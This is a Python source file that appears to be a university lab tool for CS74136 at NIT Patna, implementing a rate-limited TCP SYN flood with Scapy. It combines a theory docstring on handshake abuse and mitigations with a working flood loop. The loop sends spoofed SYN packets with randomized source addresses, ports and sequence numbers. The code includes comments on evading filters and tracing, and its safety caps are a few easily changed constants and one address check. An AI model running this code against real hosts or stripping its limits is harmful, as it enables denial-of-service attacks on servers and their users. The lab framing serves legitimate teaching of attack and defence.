#!/usr/bin/env python3
"""
===============================================================================
 SYN Flood Attacker — Bounded TCP SYN Flooding & Resilience Testing
 Project (d), CS74136 Network & Systems Security, NIT Patna
===============================================================================

 PURPOSE  : Educational, rate-limited SYN flood generator for an isolated
            VMware host-only lab network.  Sends spoofed TCP SYN packets to
            a disposable target server so that students can observe the
            three-way-handshake abuse and measure mitigation effectiveness.

 !! AUTHORIZED LAB USE ONLY — NEVER point this at any host outside the lab !!

 ─────────────────────────────────────────────────────────────────────────────
 BACKGROUND — TCP SYN FLOOD ATTACK THEORY
 ─────────────────────────────────────────────────────────────────────────────

 1. Normal TCP Three-Way Handshake
    ┌────────┐                        ┌────────┐
    │ Client │ ── SYN ──────────────► │ Server │
    │        │ ◄── SYN-ACK ───────── │        │
    │        │ ── ACK ──────────────► │        │
    └────────┘                        └────────┘
    - Client sends a SYN (synchronize) segment with an Initial Sequence Number.
    - Server allocates a Transmission Control Block (TCB) in its backlog
      queue, records the client's ISN, picks its own ISN, and replies with
      SYN-ACK.
    - Client completes the handshake with ACK.  Connection is ESTABLISHED.

 2. How a SYN Flood Exploits This
    - The attacker sends many SYN packets with *spoofed* (randomized) source
      IP addresses.
    - For each SYN, the server creates a half-open TCB and replies with
      SYN-ACK to the spoofed address.  Because the spoofed host never
      initiated the connection, it either drops the SYN-ACK or is
      unreachable, so the final ACK never arrives.
    - The server's backlog queue fills with half-open connections.  Each
      entry consumes memory and a slot in the listen queue.
    - Once the backlog is full, the server can no longer accept legitimate
      connections — a Denial of Service.
    - The server retransmits SYN-ACKs (typically 3-5 times with exponential
      back-off), keeping each TCB alive for 30-120 seconds, which makes the
      attack effective even at modest packet rates.

 3. Why Source-IP Spoofing Matters
    - If the attacker used its real IP, the server's SYN-ACK would come back
      and the attacker's OS would RST it (since the SYN was sent from raw
      sockets, the OS has no matching socket).  While still harmful, it
      would reveal the attacker's identity and allow simple IP-based
      filtering.
    - Spoofing makes the flood untraceable to a single source and prevents
      simple firewall rules from blocking a single offending IP.

 4. Common Mitigations (which the companion defense script can enable)
    - SYN Cookies (net.ipv4.tcp_syncookies = 1): The server encodes state
      into the ISN of the SYN-ACK, eliminating the need for a backlog entry
      until the final ACK arrives with the correct cookie.
    - Backlog tuning (net.ipv4.tcp_max_syn_backlog): Increasing the backlog
      queue size raises the bar for the attacker.
    - SYN-ACK retries (net.ipv4.tcp_synack_retries): Lowering retries
      reduces the time each half-open connection occupies a slot.
    - Firewall rate-limiting (iptables --limit): Caps the rate of incoming
      SYN packets per source or globally.
    - TCP Fast Open / SYNPROXY: Kernel or firewall-level proxies that
      validate the handshake before passing the connection to the server.

 5. This Script's Safety Boundaries
    - Hard cap of 500 packets/sec and 120 seconds duration.
    - Refuses to run unless the target IP is in a private RFC 1918 range
      (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16).
    - Spoofed source IPs are drawn exclusively from 10.0.0.0/8 (private).
    - All activity is logged to a CSV for post-lab analysis.
===============================================================================
"""

# ─── Standard-library imports ────────────────────────────────────────────────
import argparse
import csv
import ipaddress
import os
import random
import signal
import sys
import time
from datetime import datetime

# ─── Third-party import ──────────────────────────────────────────────────────
try:
    from scapy.all import IP, TCP, send, conf  # type: ignore
except ImportError:
    sys.exit(
        "[ERROR] Scapy is not installed.\n"
        "        Install it with:  pip install scapy\n"
        "        (On Linux you may also need:  sudo apt install python3-scapy)"
    )

# ═════════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

# Hard safety limits — the script refuses values above these.
MAX_RATE = 500        # packets per second
MAX_DURATION = 120    # seconds

# Private (RFC 1918) networks used for safety validation.
PRIVATE_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
]

# Source IPs are spoofed exclusively from this private range.
SPOOF_NETWORK = ipaddress.ip_network("10.0.0.0/8")

# CSV log file written alongside the script.
LOG_FILE = "syn_flood_log.csv"

# ═════════════════════════════════════════════════════════════════════════════
# ASCII BANNER
# ═════════════════════════════════════════════════════════════════════════════

BANNER = r"""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ███████╗██╗   ██╗███╗   ██╗    ███████╗██╗      ██████╗  ██████╗║
║   ██╔════╝╚██╗ ██╔╝████╗  ██║    ██╔════╝██║     ██╔═══██╗██╔══██║
║   ███████╗ ╚████╔╝ ██╔██╗ ██║    █████╗  ██║     ██║   ██║██║  ██║
║   ╚════██║  ╚██╔╝  ██║╚██╗██║    ██╔══╝  ██║     ██║   ██║██║  ██║
║   ███████║   ██║   ██║ ╚████║    ██║     ███████╗╚██████╔╝██████╔║
║   ╚══════╝   ╚═╝   ╚═╝  ╚═══╝    ╚═╝     ╚══════╝ ╚═════╝ ╚═════╝║
║                                                                   ║
║   Bounded TCP SYN Flood — Lab Tool                                ║
║   CS74136 Network & Systems Security, NIT Patna                   ║
║                                                                   ║
╠═══════════════════════════════════════════════════════════════════╣
║  ⚠  WARNING: FOR AUTHORIZED EDUCATIONAL LAB USE ONLY             ║
║  ⚠  Target MUST be inside an isolated host-only VMware network   ║
║  ⚠  Unauthorized use against any other system is ILLEGAL          ║
╚═══════════════════════════════════════════════════════════════════╝
"""

# ═════════════════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═════════════════════════════════════════════════════════════════════════════


def is_private_ip(ip_str: str) -> bool:
    """
    Return True if *ip_str* falls within one of the RFC 1918 private ranges:
      - 10.0.0.0/8
      - 172.16.0.0/12
      - 192.168.0.0/16

    This is the main safety gate: the script refuses to send ANY traffic to
    an IP that is not private, ensuring the tool can never be (accidentally)
    pointed at a public host on the Internet.
    """
    try:
        addr = ipaddress.ip_address(ip_str)
    except ValueError:
        return False
    return any(addr in net for net in PRIVATE_NETWORKS)


def random_private_ip() -> str:
    """
    Generate a random source IP from the 10.0.0.0/8 private range.

    Why 10.x.x.x?
    - It is the largest private block (~16 million addresses), giving the
      flood good source-IP entropy so the server cannot trivially filter
      a small set of spoofed sources.
    - Using private addresses means that even if packets somehow escape the
      host-only network, ISP ingress filters will drop them (BCP 38).

    The first (.0) and last (.255) addresses of a /24 are avoided because
    they are conventionally network/broadcast addresses, though for raw
    packets it is not strictly necessary.
    """
    return "10.{}.{}.{}".format(
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(1, 254),
    )


def check_privileges() -> None:
    """
    Warn (but do not abort) if the script is not running with elevated
    privileges.  Scapy needs raw-socket access:
      - Linux / macOS : root (UID 0) or CAP_NET_RAW capability
      - Windows       : Administrator
    """
    if os.name == "nt":
        # Windows: check for Administrator via ctypes
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("[!] WARNING: Not running as Administrator.")
                print("    Scapy needs raw-socket access.  Right-click your")
                print("    terminal and choose 'Run as administrator'.\n")
        except Exception:
            print("[!] Could not determine admin status on Windows.\n")
    else:
        # POSIX: check effective UID
        if os.geteuid() != 0:
            print("[!] WARNING: Not running as root (EUID={}).".format(os.geteuid()))
            print("    Raw sockets require root.  Use: sudo python3 syn_flood.py ...\n")


def parse_arguments() -> argparse.Namespace:
    """
    Parse and validate command-line arguments.

    Key design choices
    ------------------
    * --rate is capped at MAX_RATE (500 pps) to keep the flood bounded and
      measurable.  Real attacks use tens of thousands of pps via kernel
      bypass; we intentionally stay far below that.
    * --duration is capped at MAX_DURATION (120 s) so a forgotten terminal
      does not flood indefinitely.
    * --target-ip is validated against RFC 1918 ranges before any packet
      is sent.
    """
    parser = argparse.ArgumentParser(
        description="Bounded TCP SYN Flood — Educational Lab Tool (CS74136 NIT Patna)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Example:\n"
            "  sudo python3 syn_flood.py --target-ip 192.168.72.130 "
            "--target-port 80 --rate 200 --duration 60\n"
        ),
    )

    parser.add_argument(
        "--target-ip",
        required=True,
        help="IPv4 address of the target server (must be a private RFC 1918 address).",
    )
    parser.add_argument(
        "--target-port",
        type=int,
        default=80,
        help="TCP destination port on the target (default: 80).",
    )
    parser.add_argument(
        "--rate",
        type=int,
        default=100,
        help="Packets per second (default: 100, max: {}).".format(MAX_RATE),
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=30,
        help="Duration in seconds (default: 30, max: {}).".format(MAX_DURATION),
    )
    parser.add_argument(
        "--interface",
        default=None,
        help="Network interface to send from (e.g., eth0, vmnet1).  "
             "If omitted, Scapy picks the default route.",
    )

    args = parser.parse_args()

    # ── Validate target IP is private ────────────────────────────────────
    if not is_private_ip(args.target_ip):
        parser.error(
            "Target IP '{}' is NOT in a private RFC 1918 range.\n"
            "  This tool may ONLY target:\n"
            "    10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16\n"
            "  Aborting to prevent accidental harm.".format(args.target_ip)
        )

    # ── Clamp rate and duration to hard limits ───────────────────────────
    if args.rate < 1:
        parser.error("--rate must be at least 1.")
    if args.rate > MAX_RATE:
        print("[!] Rate {} exceeds max ({}). Clamping to {}.".format(
            args.rate, MAX_RATE, MAX_RATE
        ))
        args.rate = MAX_RATE

    if args.duration < 1:
        parser.error("--duration must be at least 1.")
    if args.duration > MAX_DURATION:
        print("[!] Duration {} exceeds max ({} s). Clamping to {} s.".format(
            args.duration, MAX_DURATION, MAX_DURATION
        ))
        args.duration = MAX_DURATION

    return args


# ═════════════════════════════════════════════════════════════════════════════
# MAIN FLOOD LOOP
# ═════════════════════════════════════════════════════════════════════════════

def run_flood(args: argparse.Namespace) -> None:
    """
    Core flooding function.

    For every iteration:
      1. Generate a random spoofed source IP (10.x.x.x) and source port.
      2. Pick a random 32-bit TCP sequence number.
      3. Craft an IP/TCP packet with SYN flag set.
      4. Send the packet via Scapy's send() (layer-3, kernel-routed).
      5. Log the packet details to the CSV.
      6. Update the live console counter.
      7. Sleep to honour the requested rate limit.

    The loop exits when:
      - The requested duration expires, OR
      - The user presses Ctrl+C (SIGINT).

    After the loop, a summary is printed and the CSV is closed.
    """

    # ── Scapy configuration ──────────────────────────────────────────────
    # Suppress Scapy's per-packet "Sent 1 packets" output so our own live
    # counter is readable.
    conf.verb = 0

    # If a specific interface was requested, tell Scapy to use it.
    if args.interface:
        conf.iface = args.interface

    # ── Open CSV log ─────────────────────────────────────────────────────
    csv_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), LOG_FILE)
    csv_file = open(csv_path, "w", newline="")
    csv_writer = csv.writer(csv_file)
    csv_writer.writerow([
        "timestamp", "src_ip", "src_port", "dst_ip", "dst_port", "seq_num"
    ])

    # ── Print attack parameters ──────────────────────────────────────────
    print("=" * 65)
    print("  Target ......... {}:{}".format(args.target_ip, args.target_port))
    print("  Rate ........... {} pkt/s".format(args.rate))
    print("  Duration ....... {} s".format(args.duration))
    print("  Interface ...... {}".format(args.interface or "(default)"))
    print("  Log file ....... {}".format(csv_path))
    print("  Spoofed range .. 10.0.0.0/8")
    print("=" * 65)
    print("\n[*] Flooding starts NOW — press Ctrl+C to stop early.\n")

    # ── State variables ──────────────────────────────────────────────────
    packets_sent = 0
    start_time = time.time()
    sleep_interval = 1.0 / args.rate   # seconds between packets

    # Flag toggled by the SIGINT handler for graceful shutdown.
    interrupted = False

    def handle_sigint(signum, frame):
        """Signal handler: set flag so the loop exits cleanly."""
        nonlocal interrupted
        interrupted = True

    # Install Ctrl+C handler.
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, handle_sigint)

    # ── Flood loop ───────────────────────────────────────────────────────
    try:
        while not interrupted:
            elapsed = time.time() - start_time

            # Check duration limit.
            if elapsed >= args.duration:
                break

            # --- 1. Random spoofed source IP and port --------------------
            #
            # Source port is randomized in the ephemeral range (1024–65535)
            # to mimic diverse client connections and evade per-port filters.
            src_ip = random_private_ip()
            src_port = random.randint(1024, 65535)

            # --- 2. Random 32-bit TCP sequence number --------------------
            #
            # In a real handshake the ISN is chosen by the OS; here we
            # randomize it to prevent the server from recognizing a
            # pattern and collapsing entries.
            seq_num = random.randint(0, 0xFFFFFFFF)

            # --- 3. Craft the SYN packet ---------------------------------
            #
            # IP layer:
            #   src  = spoofed private address
            #   dst  = target server
            #
            # TCP layer:
            #   sport = random ephemeral port
            #   dport = target port (usually 80 or 8080 in the lab)
            #   flags = 'S' (SYN) — the first step of the three-way handshake
            #   seq   = random initial sequence number
            #
            # By sending ONLY the SYN and never completing the handshake
            # (no ACK in response to the server's SYN-ACK), we force the
            # server to hold a half-open connection in its backlog until
            # it times out.
            packet = (
                IP(src=src_ip, dst=args.target_ip)
                / TCP(
                    sport=src_port,
                    dport=args.target_port,
                    flags="S",
                    seq=seq_num,
                )
            )

            # --- 4. Send ------------------------------------------------
            send(packet, verbose=0)
            packets_sent += 1

            # --- 5. Log to CSV ------------------------------------------
            now = datetime.now().isoformat(timespec="milliseconds")
            csv_writer.writerow([
                now, src_ip, src_port, args.target_ip, args.target_port, seq_num
            ])

            # --- 6. Live counter ----------------------------------------
            #
            # \r returns the cursor to the start of the line so each
            # update overwrites the previous one, producing a clean
            # single-line counter.
            current_rate = packets_sent / max(elapsed, 0.001)
            sys.stdout.write(
                "\r  [►] Packets: {:>7,}  |  Elapsed: {:>6.1f}s  |  "
                "Rate: {:>6.1f} pkt/s".format(
                    packets_sent, elapsed, current_rate
                )
            )
            sys.stdout.flush()

            # --- 7. Rate limiting (sleep) --------------------------------
            #
            # A simple fixed sleep keeps the average rate close to the
            # target.  For very high rates the actual send() time may
            # cause the effective rate to be slightly lower than requested,
            # which is acceptable and safe.
            time.sleep(sleep_interval)

    except Exception as exc:
        print("\n\n[!] Unexpected error: {}".format(exc))

    finally:
        # ── Restore original SIGINT handler ──────────────────────────────
        signal.signal(signal.SIGINT, original_handler)

        # ── Close CSV log ────────────────────────────────────────────────
        csv_file.flush()
        csv_file.close()

        # ── Summary ─────────────────────────────────────────────────────
        end_time = time.time()
        total_duration = end_time - start_time
        avg_rate = packets_sent / max(total_duration, 0.001)

        print("\n")
        print("=" * 65)
        print("  FLOOD SUMMARY")
        print("=" * 65)
        print("  Total packets sent .... {:,}".format(packets_sent))
        print("  Total duration ........ {:.2f} s".format(total_duration))
        print("  Average rate .......... {:.1f} pkt/s".format(avg_rate))
        print("  Log written to ........ {}".format(csv_path))
        if interrupted:
            print("  Stopped by ............ Ctrl+C (user interrupt)")
        else:
            print("  Stopped by ............ duration limit reached")
        print("=" * 65)
        print("\n[✓] Done.  Analyse {} for packet details.\n".format(LOG_FILE))


# ═════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def main():
    """
    Entry point: show banner → check privileges → parse args → flood.
    """
    # 1. Print the ASCII banner and legal warning.
    print(BANNER)

    # 2. Check root / admin privileges (warns but does not abort).
    check_privileges()

    # 3. Parse and validate command-line arguments.
    #    This will sys.exit() if the target IP is not private or if
    #    required arguments are missing.
    args = parse_arguments()

    # 4. Run the flood loop.
    run_flood(args)


if __name__ == "__main__":
    main()
